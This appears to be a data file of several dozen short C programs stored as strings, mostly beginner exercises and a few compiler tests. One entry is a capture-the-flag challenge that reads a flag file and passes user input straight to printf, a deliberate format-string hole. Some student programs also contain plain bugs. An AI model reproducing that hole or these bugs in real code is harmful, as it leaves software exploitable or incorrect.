    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n int num;\n float s;\n printf(\"Please enter a number: \");\n scanf(\"%d\",&num);\n if(num > 10){\n  s = 3 * (num + 3.14);\n }\n else{\n  s = num * (num - 3.14);\n }\n printf(\"The result is %f\\n\", s);\n printf(\"num = %d, s = %f\\n\", num, s);\n return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char* argv[]){\n    int numbers[5];\n    int temp;\n    printf(\"Input the first number: \\n\");\n    scanf(\"%d\", &numbers[0]);\n    printf(\"Input the second number: \\n\");\n    scanf(\"%d\", &numbers[1]);\n    printf(\"Input the third number: \\n\");\n    scanf(\"%d\", &numbers[2]);\n    printf(\"Input the fourth number: \\n\");\n    scanf(\"%d\", &numbers[3]);\n    printf(\"Input the fifth number: \\n\");\n    scanf(\"%d\", &numbers[4]);\n    for(int i = 0; i < sizeof(numbers)/sizeof(int); i++){\n        if(numbers[i] > temp){\n            temp = i;\n        }\n    }\n    printf(\"The maximum value is: %d\\n\", numbers[temp]);\n    printf(\"Its position is: %d\\n\", temp+1);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n   int i = 0, n;\n   printf(\"Enter the value of n\\n\");\n   scanf(\"%d\", &n);\n   do {\n      printf(\"The value of n is %d\\n\", i+1);\n      i++;\n   } while (i < n);\n   return 0;\n}",
    "#include <stdlib.h>\nint main()\n{\n  int a[10], i=2;\n  int *p, *q;\n  q=&a[0];\n  p=q+i;\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    char x1[4];\n    int x2[4];\n    short int x3[4];\n    float x4[4];\n    double x5[4];\n    printf(\"\\n char: \\n\");\n    printf(\"%p\", x1 );\n    printf(\"\\n %p\", x1 + 1);\n    printf(\"\\n %p\", x1 + 2);\n    printf(\"\\n %p\", x1 + 3);\n    printf(\"\\n int: \\n\");\n    printf(\"%p\", x2 );\n    printf(\"\\n %p\", x2 + 1);\n    printf(\"\\n %p\", x2 + 2);\n    printf(\"\\n %p\", x2 + 3);\n    printf(\"\\n short int: \\n\");\n    printf(\"%p\", x3 );\n    printf(\"\\n %p\", x3 + 1);\n    printf(\"\\n %p\", x3 + 2);\n    printf(\"\\n %p\", x3 + 3);\n    printf(\"\\n float: \\n\");\n    printf(\"%p\", x4 );\n    printf(\"\\n %p\", x4 + 1);\n    printf(\"\\n %p\", x4 + 2);\n    printf(\"\\n %p\", x4 + 3);\n    printf(\"\\n double: \\n\");\n    printf(\"%p\", x5);\n    printf(\"\\n %p\", x5 + 1);\n    printf(\"\\n %p\", x5 + 2);\n    printf(\"\\n %p\", x5 + 3);\n    printf(\"\\n\");\n    printf(\"\\n Tamanho do char: %lu\", sizeof(char));\n    printf(\"\\n Tamanho do int: %lu\", sizeof(int));\n    printf(\"\\n Tamanho do short: int: %lu\", sizeof(short int));\n    printf(\"\\n Tamanho do float: %lu\", sizeof(float));\n    printf(\"\\n Tamanho do double: %lu\", sizeof(double));\n    return 0;\n}",
    "#include <stdio.h>\nvoid print(int *i, int *j) {\n printf(\"%d_____\\t%d____\\t%s\\n\", *i, *j, (*i < 99) ? \"<\" : \">=\");\n}\nvoid add(int *i, int *j) {\n ++*i;\n *j += *i;\n print(i, j);\n}\nvoid subtract(int *i, int *j) {\n ++*i;\n *j -= *i;\n print(i, j);\n}\nint main(int argc, char *argv[]) {\n int i = 0, j = 0;\n printf(\"i______\\tj______\\ti : 99\\n\\n\");\n print(&i, &j);\n add(&i, &j);\n while (i < 99) {\n  subtract(&i, &j);\n  add(&i, &j);\n }\n printf(\"\\n%d\\n\", j);\n getchar();\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n   FILE *cfPtr;\n   if ((cfPtr = fopen(\"clients.txt\", \"r\")) == ((void*)0)) {\n      puts(\"File could not be opened\");\n   }\n   else {\n      unsigned int account;\n      char name[30];\n      double balance;\n      printf(\"%-10s%-13s%s\\n\", \"Account\", \"Name\", \"Balance\");\n      fscanf(cfPtr, \"%d%29s%lf\", &account, name, &balance);\n      while (!feof(cfPtr)) {\n         printf(\"%-10d%-13s%7.2f\\n\", account, name, balance);\n         fscanf(cfPtr, \"%d%29s%lf\", &account, name, &balance);\n      }\n      fclose(cfPtr);\n   }\n}",
    "#include<stdio.h>\nint main(){\n  int sum = 1;\n  int i =1;\n#pragma omp parallel for firstprivate(i) reduction( + : sum )\n  for (int j = i; j < 100; j++) {\n    sum +=1;\n  }\n  printf(\"sum is %d\\n\",sum);\n}",
    "#include <stdio.h>\n#include <stdbool.h>\n\nint binaryToDecimal(_Bool* array, int size)\n{\n    int result = 0;\n    int temp = 1;\n    for (int i = size - 1; i >= 0; i--)\n    {\n        if (array[i])\n        {\n            result += temp;\n        }\n        temp *= 2;\n    }\n    return result;\n}\nint compare(int firstNumber, int secondNumber)\n{\n    if (firstNumber == secondNumber)\n    {\n        return 0;\n    }\n    if (firstNumber > secondNumber)\n    {\n        return 1;\n    }\n    if (firstNumber < secondNumber)\n    {\n        return 2;\n    }\n}\n_Bool testBinaryToDecimal(void)\n{\n    _Bool array0[8] = { 0, 0, 0, 0, 0, 0, 0, 0 };\n    _Bool array5[8] = { 0, 0, 0, 0, 0, 1, 0, 1 };\n    _Bool array8[8] = { 0, 0, 0, 0, 1, 0, 0, 0 };\n    _Bool array15[8] = { 0, 0, 0, 0, 1, 1, 1, 1, };\n    return binaryToDecimal(array15, 8) == 15 && binaryToDecimal(array8, 8) == 8 &&\n        binaryToDecimal(array5, 8) == 5 && binaryToDecimal(array0, 8) == 0;\n}\n_Bool testCompare(void)\n{\n    int ten = 10;\n    int newTen = 10;\n    int one = 1;\n    if ((compare(ten, newTen) == 0) && (compare(ten, one) == 1) && (compare(one, ten) == 2))\n    {\n        return 1;\n    }\n    return 0;\n}\nint main(int argc, char* argv[])\n{\n    if (!testBinaryToDecimal() || !testCompare())\n    {\n        return 111;\n    }\n    if (argc > 1)\n    {\n        return 0;\n    }\n    _Bool firstNumber[8] = { 1, 0, 0, 0, 0, 1, 1, 1 };\n    _Bool secondNumber[8] = { 1, 0, 1, 0, 1, 0, 0, 1 };\n    int decimalFirstNumber = binaryToDecimal(firstNumber, 8);\n    int decimalSecondNumber = binaryToDecimal(secondNumber, 8);\n    printf(\"%d %d\", decimalFirstNumber, decimalSecondNumber);\n    switch (compare(decimalFirstNumber, decimalSecondNumber))\n    {\n    case 0:\n        printf(\"\\n\u0427\u0438\u0441\u043b\u0430 \u0440\u0430\u0432\u043d\u044b.\");\n        break;\n    case 1:\n        printf(\"\\n\u0427\u0438\u0441\u043b\u043e %d \u0431\u043e\u043b\u044c\u0448\u0435.\", decimalFirstNumber);\n        break;\n    case 2:\n        printf(\"\\n\u0427\u0438\u0441\u043b\u043e %d \u0431\u043e\u043b\u044c\u0448\u0435.\", decimalSecondNumber);\n        break;\n    }\n}",
    "int main() {\n    int cond = 5;\n    int *ptr = &cond;\n    if (cond > 9) {\n        ptr = 0;\n    }\n    cond = *ptr;\n}",
    "#include <stdio.h>\nint main(){\n int x,n,y;\n printf(\"Enter the value of x and n\\t\");\n scanf(\"%d%d\",&x,&n);\n switch(n){\n case 1:{\n  y=1+(x*x);break;\n }\n case 2:{\n  y=1+(x/n);break;\n }\n case 3:{\n  y=1+(2*x);break;\n }\n default:{\n  y=1+(n*x);\n }\n }\nprintf(\"Output is %d\\n\",y);\nreturn 0;\n}",
    "#include <fcntl.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\nchar buf[4096];\nvoid do_fd(int fd)\n{\n while(1)\n {\n  ssize_t nread = read(fd, buf, sizeof(buf));\n  if(nread == 0)\n  {\n   break;\n  }\n  if(nread < 0)\n  {\n   perror(\"read\");\n   exit(-1);\n  }\n  ssize_t nwrite = write(1, buf, nread);\n  if(nwrite != nread)\n  {\n   perror(\"write\");\n   exit(-1);\n  }\n }\n}\nint main(int argc, const char **argv)\n{\n if(argc < 2)\n {\n  do_fd(0);\n  return 0;\n }\n for(int aa = 1; aa < argc; aa++)\n {\n  int fd = open(argv[aa], (0x04000000));\n  if(fd < 0)\n  {\n   perror(\"open\");\n   exit(-1);\n  }\n  do_fd(fd);\n  close(fd);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <ctype.h>\n#include <math.h>\n\n\nint otoi(const char *s);\nint main(int argc, char **argv)\n{\n    if(argc != 2) {\n        printf(\"Converts character string from octal notation to decimal\\n\"\n                \"Usage:  ./oct2dec STRING\\n\"\n                \"Example ./oct2dec 177\\n\"\n                \"        ./oct2dec 0o177\\n\"\n                \"        ./oct2dec 0O177\\n\"\n              );\n        return -1;\n    }\n    printf(\"Octal: %s\\nDecimal: %d\\n\", argv[1], otoi(argv[1]));\n    return 0;\n}\nint otoi(const char *s)\n{\n    int i;\n    int len, result, power;\n    len = strlen(s);\n    if (s[0] == '0' && (s[1] == 'o' || s[1] == 'O')) {\n        i = 2;\n        power = len - 2 - 1;\n    } else if (s[0] == '0') {\n        i = 1;\n        power = len - 1 - 1;\n    }\n    else {\n        i = 0;\n        power = len - 1;\n    }\n    result = 0;\n    while (i < len) {\n        if((0 ? isdigit(s[i]) : ((unsigned)(s[i])-'0') < 10)) {\n            result += (s[i] - '0') * pow(8, power);\n            --power;\n        }\n        ++i;\n    }\n    return result;\n}",
    "#include<stdio.h>\nint main()\n{\n int n,i,arr[100], j,mid,pos,k,first=0, last;\n printf(\"enter the size of array\");\n scanf(\"%d\",&n);\n printf(\"enter the data at assending order\");\n for(i=0;i<n;i++)\n {\n  printf(\"arr[%d]:\",i);\n  scanf(\"%d\",&arr[i]);\n }\n last=n-1;\n printf(\"enter number :\");\n scanf(\"%d\",&k);\n while(first<=last)\n {\n  mid=(first+last)/2;\n  if(arr[mid]==k)\n  {\n   pos=mid;\n   break;\n  }\n  else\n  {\n   if(arr[mid]>k)\n   {\n    last = mid-1;\n   }\n   else\n   {\n    first=mid+1;\n   }\n  }\n }\n if(first<=last)\n {\n  printf(\"the position is %d\",pos);\n }\n else\n {\n  printf(\"unsuccessful\");\n }\n return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\nint main(int argc, char** argv)\n{\n    char flag[64];\n    char commandString[64];\n    char userflag[256];\n    memset(&flag, 0, 64);\n    memset(&commandString, 0, 64);\n    memset(&userflag, 0, 256);\n    FILE *fp = fopen(\"/home/pwn2/flag.txt\", \"r\");\n    if (fp != ((void*)0)) {\n        size_t newLen = fread(flag, sizeof(char), 63, fp);\n        if ( ferror( fp ) != 0 ) {\n            fputs(\"Error reading file\", (stderr));\n        } else {\n            flag[newLen++] = '\\0';\n        }\n        fclose(fp);\n    }\n    puts(\" ****************************************************************************\\n This is a Nexxus computer system, which may be accessed\\n  and used only for authorized Nexxus business by authorized personnel.\\n Unauthorized access or use of this computer system may subject violators\\n to criminal, civil, and/or administrative action.\\n\\n All information on this computer system may be intercepted, recorded,\\n read, copied, and disclosed by and to authorized personnel for official\\n purposes, including criminal investigations. Such information includes\\n sensitive data encrypted to comply with confidentiality and privacy\\n requirements. Access or use of this computer system by any person, whether\\n authorized or unauthorized, constitutes consent to these terms. There is no\\n right of privacy in this system.\\n ****************************************************************************\\n\");\n    fputs(\"Command: \", (stdout));\n    fflush((stdout));\n    fgets(commandString, 64, (stdin));\n    commandString[strcspn(commandString, \"\\r\\n\")] = 0;\n    if (!strncmp(commandString, \"checkflag\", strlen(\"checkflag\"))) {\n        fputs(\"flag: \", (stdout));\n        fflush((stdout));\n        fgets(userflag, 256, (stdin));\n        userflag[strcspn(userflag, \"\\r\\n\")] = 0;\n        if (!strncmp(userflag, flag, strlen(flag))) {\n            printf(\"You got the correct flag! (%s)\\n\", flag);\n        } else {\n            puts(\"Wrong flag!\");\n            printf(userflag);\n        }\n    } else {\n        puts(\"Invalid command!\");\n    }\n    puts(\"Disconnected.\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    double grade;\n    scanf(\"%lf\", &grade);\n    if (grade >= 5.50) {\n        printf(\"Excellent!\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nvoid dothing(char *arg) {\n  printf(\"String: \\\"%s\\\", length: %lu\\n\", arg, strlen(arg));\n}\nint main(void)\n{\n  dothing(\"hello\");\n}",
    "#include <ctype.h>\n#include <stdio.h>\n\nint mgetline(char line[], int lim);\ndouble atof(char s[]);\nint main(void)\n{\n char s[1000];\n double d;\n mgetline(s, 1000);\n d = atof(s);\n printf(\"%10.15lf\\n\", d);\n return (0);\n}\nint mgetline(char line[], int lim)\n{\n int c, i;\n for (i = 0; i < lim - 1 && (c = getchar()) != (-1) && c != '\\n'; ++i)\n {\n  line[i] = c;\n }\n if (c == '\\n')\n {\n  line[i++] = c;\n }\n line[i] = '\\0';\n return (i);\n}\ndouble atof(char s[])\n{\n double val, val2, power, power2;\n int i, j, sign, esign;\n for (i = 0; __isspace(s[i]); i++)\n  ;\n sign = s[i] == '-' ? -1 : 1;\n if (s[i] == '+' || s[i] == '-')\n {\n  i++;\n }\n for (val = 0; (0 ? isdigit(s[i]) : ((unsigned)(s[i])-'0') < 10); i++)\n {\n  val = 10 * val + (s[i] - '0');\n }\n if (s[i] == '.')\n {\n  i++;\n }\n for (power = 1; (0 ? isdigit(s[i]) : ((unsigned)(s[i])-'0') < 10); i++)\n {\n  val = 10 * val + (s[i] - '0');\n  power *= 10;\n }\n if (s[i] == 'e' || s[i] == 'E')\n {\n  i++;\n }\n if (s[i] == '-')\n {\n  esign = -1;\n  i++;\n }\n for (val2 = 0; (0 ? isdigit(s[i]) : ((unsigned)(s[i])-'0') < 10); i++)\n {\n  val2 = 10 * val2 + (s[i] - '0');\n }\n for (j = 0, power2 = 1; j < val2; j++)\n {\n  power2 *= 10;\n }\n if (esign >= 0)\n {\n  return sign * val / power * power2;\n }\n else\n {\n  return sign * val / power / power2;\n }\n}",
    "#include <stdio.h>\nint main(int argc, char const *argv[]) {\n  float grade1, grade2, grade3, grade4;\n  printf(\"Insert the grade(1): \");\n  scanf(\"%f\", &grade1);\n  printf(\"Insert the grade(2): \");\n  scanf(\"%f\", &grade2);\n  printf(\"Insert the grade(3): \");\n  scanf(\"%f\", &grade3);\n  printf(\"Insert the grade(4): \");\n  scanf(\"%f\", &grade4);\n  printf(\"result: %.2f\", (grade1 + grade2 + grade3 + grade4) / 4.0);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main (int argc, char * argv[])\n{\n    char ch;\n    FILE * fp;\n    if (argc == 1)\n    {\n        printf(\"usage: %s [file1] [file2] ...\\n\", argv[0]);\n        exit(1);\n    }\n    for (int i = 1; i < argc; i++)\n    {\n        if ((fp = fopen(argv[i], \"r\")) == ((void*)0))\n        {\n            printf(\"Cannot open %s for reading\\n\", argv[i]);\n            exit(1);\n        }\n        while ((ch = getc(fp)) != (-1))\n            putchar(ch);\n        if (fclose(fp) != 0)\n        {\n            printf(\"Cannot close %s\\n\", argv[i]);\n            exit(1);\n        }\n    }\n    return 0;\n}",
    "\n\n\n\n  typedef unsigned uint32_t;\n  typedef int int32_t;\n\nextern void abort (void);\n__attribute__ ((noinline, noclone)) unsigned long long f1 (int32_t x)\n{\n  return ((unsigned long long) x) << 4;\n}\n__attribute__ ((noinline, noclone)) long long f2 (uint32_t x)\n{\n  return ((long long) x) << 4;\n}\n__attribute__ ((noinline, noclone)) unsigned long long f3 (uint32_t x)\n{\n  return ((unsigned long long) x) << 4;\n}\n__attribute__ ((noinline, noclone)) long long f4 (int32_t x)\n{\n  return ((long long) x) << 4;\n}\nint main ()\n{\n  if (f1 (0xf0000000) != 0xffffffff00000000)\n    abort ();\n  if (f2 (0xf0000000) != 0xf00000000)\n    abort ();\n  if (f3 (0xf0000000) != 0xf00000000)\n    abort ();\n  if (f4 (0xf0000000) != 0xffffffff00000000)\n    abort ();\n  return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main(){\n  FILE *f = fopen(\"file.txt\", \"w\");\n  if (f == ((void*)0)){\n    printf(\"Error opening file!\\n\");\n    exit(1);\n  }\n  char c = 'A';\n  fprintf(f, \"A character: %c\\n\", c);\n  fclose(f);\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nint main (int argc, char *argv[])\n{\n  static char daytab[2][13] = {\n       {0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31},\n       {0, 31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31}\n  };\n  int i;\n  int leap;\n  int year, month, doy, day;\n  if ( argc != 3) {\n    fprintf((stderr), \"Usage: %s <year> <doy>\\n\", argv[0]);\n    exit(1);\n  }\n  year = atoi(argv[1]);\n  doy = atoi(argv[2]);\n  leap = (year % 4 == 0 && year % 100 != 0) || year % 400 == 0;\n  if (leap == 1) {\n    if (doy > 366) {\n      fprintf((stderr), \"There are 366 days in %d\\n\", year);\n      exit(1);\n   }\n  }\n  else {\n    if (doy > 365) {\n      fprintf((stderr), \"There are 365 days in %d\\n\", year);\n      exit(1);\n   }\n  }\n  for (i = 1; doy > daytab[leap][i]; i++)\n      doy -= daytab[leap][i];\n  month = i;\n  day = doy;\n  printf(\"%3d%3d\\n\",month, day);\n  return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n      unsigned long N1=2;\n      unsigned long N2=1;\n      unsigned long N_sum=0;\n      unsigned long N_number=0;\n printf(\"%lu\\n\",N1);\n printf(\"%lu\\n\",N2);\n for(N_number;N_number<100;N_number++)\n        {\n  N_sum=N1+N2;\n  printf(\"%lu\\n\",N_sum);\n  N1=N2;\n  N2=N_sum;\n }\nreturn 0;\n}",
    "#include <stdio.h>\nint main(){\n int nasc, ano, idade;\n printf(\"Digite em que ano estamos: \");\n scanf(\"%d\",&ano);\n printf(\"Digite a sua idade: \");\n scanf(\"%d\",&idade);\n nasc = ano-idade;\n printf(\"Voce nasceu no ano de: %d \\n\");\n return 0;\n}",
    "#include <stdio.h>\nint main () {\n int ID, IDmin;\n printf (\"Digite sua idade:\\n\");\n scanf (\"%d\", &ID);\n IDmin = ID*365*24*60;\n printf (\"A idade em minutos \u00e9: %d\\n\", IDmin);\nreturn 0;\n}",
    "#include <stdlib.h>\nint sub1 (i)\n     int i;\n{\n  return i - (5 - i);\n}\nint sub2 (i)\n     int i;\n{\n  return i + (5 + i);\n}\nint sub3 (i)\n     int i;\n{\n  return i - (5 + i);\n}\nint sub4 (i)\n     int i;\n{\n  return i + (5 - i);\n}\nint main()\n{\n  if (sub1 (20) != 35)\n    abort ();\n  if (sub2 (20) != 45)\n    abort ();\n  if (sub3 (20) != -5)\n    abort ();\n  if (sub4 (20) != 5)\n    abort ();\n  exit (0);\n}",
    "#include <stdbool.h>\n#include <stdio.h>\n\nstatic unsigned int fib, fib_minus1 = 1, fib_minus2 = 0;\nint fibonacci(void) {\n   fib = fib_minus1 + fib_minus2;\n   fib_minus2 = fib_minus1;\n   fib_minus1 = fib;\n   return fib;\n}\nint main(void) {\n   FILE *izlTok = fopen(\"fibonacci.bin\", \"wb\");\n   for (int i = 0; i < 40; i++) {\n      int broj = fibonacci(), *p1 = &broj;\n      fwrite(p1, sizeof(int), 1, izlTok);\n   }\n   fclose(izlTok);\n   return 0;\n}",
    "#include <stdio.h>\n#include<math.h>\nint reverse_num(int num)\n{\n    int rev =0 ;\n    while(num!=0)\n    {\n        rev = rev * 10 + (num%10);\n        num = num / 10 ;\n    }\n    return rev;\n}\nint is_prime(int num)\n{\n    int i;\n    for(i = 2 ; i< num/2 + 1 ; i++)\n    {\n        if(num % i == 0)\n        {\n                return 0;\n        }\n    }\n    return 1;\n}\nint main()\n{\n    int num;\n    int reverse;\n    int x;\n    int y;\n    printf(\"Enter the number: \\n\");\n    scanf(\"%d\",&num);\n    reverse= reverse_num(num);\n    x= is_prime(num);\n    y= is_prime(reverse);\n    if (x==1&&y==1)\n    {\n        printf(\"The number %d is a emirp number\",num);\n    }\n    else\n    {\n        printf(\"The number %d is not a emirp number\",num);\n    }\n    return 0;\n}",
    "int func()\n{\n    return 0;\n}\nint main (int argc, char* argv [])\n{\n    return func();\n}",
    "int main() {\n    int array[10] = { 1,2,3,4};\n    return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nint main(void) {\n char *val;\n setenv(\"HBENV\", \"hbooks\", 1);\n val = getenv(\"HBENV\");\n if (val == ((void*)0))\n  printf(\"HBENV not defined\\n\");\n else\n  printf(\"HBENV = %s\\n\", val);\n unsetenv(\"HBENV\");\n val = getenv(\"HBENV\");\n if (val == ((void*)0))\n  printf(\"HBENV not defined\\n\");\n else\n  printf(\"HBENV = %s\\n\", val);\n return 0;\n}",
    "#include<stdio.h>\nint main(int argc, char const *argv[])\n{\n    float celsius = 3;\n    float far;\n    far = (celsius * 9/5) + 32;\n    printf (\" The value of far is %f\\n\", far);\n    return 0;\n}",
    "#include <stdio.h>\n#include <pthread.h>\n#include <unistd.h>\nvoid *t1_task();\nvoid *t2_task();\npthread_t t1, t2;\npthread_mutex_t mutex;\npthread_cond_t cv;\nint processed = 0;\nint main(int argc, char *argv[])\n{\n    int status;\n    pthread_mutex_init(&mutex, ((void*)0));\n    pthread_cond_init(&cv, ((void*)0));\n    status = pthread_create(&t1, ((void*)0), t1_task, (void *)0);\n    if (status)\n    {\n        printf(\"Error creating thread 1 %d\\n\", status);\n    }\n    status = pthread_create(&t2, ((void*)0), t2_task, (void *)0);\n    if (status)\n    {\n        printf(\"Error creating thread 2 %d\\n\", status);\n    }\n    sleep(4);\n    status = pthread_cancel(t1);\n    if (status)\n    {\n        printf(\"Error cancelling thread 1 %d\\n\", status);\n    }\n    status = pthread_cancel(t2);\n    if (status)\n    {\n        printf(\"Error cancelling thread 2 %d\\n\", status);\n    }\n    return 0;\n}\nvoid *t1_task(void *argument)\n{\n    sleep(1);\n    pthread_mutex_lock(&mutex);\n    printf(\"Me quedo esperando en el t1\\n\");\n    while (processed == 0)\n    {\n        pthread_cond_wait(&cv, &mutex);\n    }\n    printf(\"He obtenido el mutex tras esperar en el t1\\n\");\n    processed = 0;\n    pthread_mutex_unlock(&mutex);\n    pthread_exit(((void*)0));\n}\nvoid *t2_task(void *argument)\n{\n    pthread_mutex_lock(&mutex);\n    processed = 1;\n    pthread_cond_signal(&cv);\n    printf(\"He signaleado en el t2\\n\");\n    pthread_mutex_unlock(&mutex);\n    printf(\"Dejo el mutex en el t2\\n\");\n    pthread_exit(((void*)0));\n}",
    "#include <stdio.h>\nint binsearch(int x, int v[], int n);\nint main()\n{\n    int a[10];\n    for(int i = 0; i < 10; i++)\n        a[i] = i;\n    printf(\"%d\", binsearch(4, a, 10));\n    return 0;\n}\nint binsearch(int x, int v[], int n)\n{\n    int low, high, mid;\n    low = 0;\n    high = n - 1;\n    while (low < high) {\n        unsigned mid = (low + high) >> 1;\n        if (v[mid] < x)\n            low = mid + 1;\n        else\n            high = mid;\n    }\n    return ((high == low) && (v[high] == x)) ? low : -1;\n}",
    "#include <stdio.h>\nint main()\n{\n int vetorA[5];\n int i, acha, busca;\n for (i=0;i<5;i++)\n {\n  printf(\"Digite o %d elemento: \", i);\n  scanf(\"%d\", &vetorA[i]);\n }\n printf(\"Informe o elemento que deseja buscar: \");\n scanf(\"%d\", &busca);\n i = 0;\n acha = 0;\n while ((acha == 0 ) && (i < 5))\n {\n     if (vetorA[i] == busca)\n     {\n       acha = 1;\n     }\n     else\n     {\n      i++;\n     }\n    }\n    if (acha == 1)\n        printf(\"O elemento %d foi encontrado na posi\ufffd\ufffdo %d.\",busca, i);\n    else\n        printf(\"O elemento n\ufffdo foi encontrado.\");\n        return (0);\n}",
    "#include<stdio.h>\nint main()\n{\n long int percent, pop = 100000;\n int i;\n for(i=1;i<=10;i++)\n {\n  percent = 0.1 * pop;\n  pop = (pop - percent);\n  printf(\"%d year = %ld\\n\",i,pop);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    printf(\"Enter your age: \");\n    int userAge;\n    scanf(\"%d\", &userAge);\n    printf(\"You are %d years old.\\n\", userAge);\n    char grade;\n    printf(\"Enter your grade: \");\n    scanf(\"%c\", &grade);\n    printf(\"Your grade is: %c\", grade);\n    double gpa;\n    printf(\"Enter your gpa: \");\n    scanf(\"%lf\", &gpa);\n    printf(\"Your gpa is: %lf \\n\", gpa);\n    char name[20];\n    printf(\"Enter your name: \");\n    fgets(name, 20, (stdin));\n    printf(\"Your name is %s\", name);\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n#include <string.h>\n#include <stdbool.h>\n\n\n\nstatic _Bool is_palindrome_number(int number);\nint main(void) {\n    _Bool _global_prime_table[10240] = { 0 };\n    for (size_t i = 1; (i * 2 + 1) < sqrt((10240 * 2 + 1)); ++i) {\n        if (_global_prime_table[i] == 0) {\n            for (size_t t = 3; t * (i * 2 + 1) < (10240 * 2 + 1); t += 2) {\n                _global_prime_table[((t * (i * 2 + 1) - 1) / 2)] = 1;\n            }\n        }\n    }\n    for (size_t i = 0, out_cnt = 0; i < 10240; ++i) {\n        if (_global_prime_table[i] == 0) {\n            if (is_palindrome_number((i * 2 + 1))) {\n                printf(\"%8d \", (i * 2 + 1));\n                out_cnt += 1;\n                if (out_cnt % 8 == 0) {\n                    puts(\"\");\n                }\n            }\n        }\n    }\n    return 0;\n}\nstatic _Bool is_palindrome_number(int number) {\n    if (number < 10) {\n        return 1;\n    }\n    char to_string[16] = { 0 };\n    sprintf(to_string, \"%d\", number);\n    for (size_t i = 0; i < strlen(to_string) / 2; ++i) {\n        if (to_string[i] != to_string[strlen(to_string) - 1 - i]) {\n            return 0;\n        }\n    }\n    return 1;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main (){\n char nome[100];\n float p1,p2,p3,p4,nota;\n printf(\"Por digite o nome e as quatro notas de um aluno:\\n\");\n printf(\"NOME == \");\n scanf(\"%s\", nome);\n printf(\"P1 == \");\n scanf(\"%f\", &p1);\n printf(\"P2 == \");\n scanf(\"%f\", &p2);\n printf(\"P3 == \");\n scanf(\"%f\", &p3);\n printf(\"P4 == \");\n scanf(\"%f\", &p4);\n  nota=(p1+p2+p3+p4)/4;\n  if (nota>=6){\n   printf(\"O aluno %s foi aprovado\\n\", nome);}\n  else {\n   printf(\"O aluno %s foi reprovado\\n\", nome);}\nreturn 0;}",
    "#include<stdio.h>\nint main(){\n    int X, Y;\n    do {\n        scanf(\"%d%d\", &X, &Y);\n        if (X > Y) {\n            printf(\"Decrescente\\n\");\n        } else if (X < Y) {\n            printf(\"Crescente\\n\");\n        }\n    } while (X != Y);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint selmin(int v[], int i, int n){\n    int j, k=i;\n    for(j=i+1;j<n;j++)\n      if(v[j]<v[k])\n        k=j;\n    return k;\n}\nint selection(int v[], int n){\n  int i, k , x;\n  for(i=0;i<n-1;i++){\n     k = selmin(v,i,n);\n     x = v[i];\n     v[i] = v[k];\n     v[k] = x;\n  }\n}\nint main(){\n     int T, x, i, N[12], j;\n     scanf(\" %d\" , &T);\n     j=0;\n     while(j<T){\n       scanf(\" %d\" , &x);\n         for(i=0;i<x;i++) scanf(\" %d\" , &N[i]);\n         selection(N,x);\n         printf(\"Case %d: %d\\n\", j+1 , N[x/2]);\n      j++;\n     }\nreturn 0;\n}",
    "#include <stdio.h>\nint main() {\n if(printf(\"CppNuts\")){}\n while(!printf(\"CppNuts\")) {}\n}",
    "#include <stdio.h>\n#include <math.h>\ndouble a1[3],a2[3];\ndouble magnitud(), suma(), escalar(), vectorial();\nvoid leer(double a[]);\nint main()\n{\n    puts(\"Ingrese las coordenadas del primer vector\");\n    leer(a1);\n    puts(\"Ingrese las coordenadas del segundo vector\");\n    leer(a2);\n    magnitud();\n    suma();\n    escalar();\n    vectorial();\n    return 0;\n}\nvoid leer(double a[]){\n    for(int i=0;i<=2;i++){\n        scanf(\"%lf\",&a[i]);\n    }\n}\ndouble magnitud(){\n    double m1=0,m2=0;\n    puts(\"La magnitud es: \");\n    for(int i=0;i<=2;i++){\n        m1+=a1[i]*a1[i];\n        m2+=a2[i]*a2[i];\n    }\n    m1=sqrt(m1);\n    m2=sqrt(m2);\n    printf(\"\\n para el primer vector %.2lf\",m1);\n    printf(\"\\n para el segundo vector %.2lf\",m2);\n    return m1,m2;\n}\ndouble suma(){\n    double a[3];\n    puts(\"\\n La suma de los dos vectores es \\n\");\n    for(int i=0;i<=2;i++){\n        a[i]= a1[i]+a2[i];\n        printf(\"%.2lf \\n\",a[i]);\n    }\n}\ndouble escalar(){\n    puts(\"El producto escalar de los dos vectores es \");\n    double esc=0;\n    for(int i=0;i<=2;i++){\n        esc+=(double)a1[i]*a2[i];\n    }\n    printf(\"%.2lf \\n\",esc);\n    return esc;\n}\ndouble vectorial(){\n    puts(\"El producto vectorial de los dos vectores es \\n\");\n    double vec[3];\n    for(int i=0;i<=2;i++){\n        vec[i] = (double) a1[(i+1)%3]*a2[(i+2)%3] - a1[(i+2)%3]*a2[(i+1)%3];\n        printf(\"%.2lf \\n\",vec[i]);\n    }\n}",
    "#include <stdint.h>\nextern void abort (void);\nint main (void)\n{\n  uint32_t a = 0x80000000;\n  uint32_t b;\n  b = __builtin_bswap32 (a);\n  a = __builtin_bswap32 (b);\n  if (b != 0x80 || a != 0x80000000)\n    abort ();\n  return 0;\n}",
